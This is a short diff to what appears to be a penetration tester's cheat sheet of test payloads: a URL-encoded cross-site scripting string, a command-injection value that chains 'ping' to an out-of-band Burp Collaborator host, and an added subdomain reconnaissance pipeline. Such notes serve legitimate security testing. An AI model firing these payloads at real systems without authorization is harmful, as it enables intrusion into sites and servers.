@@ -11,3 +11,5 @@
 ``` %27)+O+%22%3E%3Cscript%3Ealert(document.domain);%3C/script%3E ```
 
 ``` galletita ; ping -c 1 burp.oastify.com ```
+
+``` subfinder -d X | /home/kali/go/bin/httpx -u -status-code -title -tech-detect -follow-redirects -timeout 5 ```
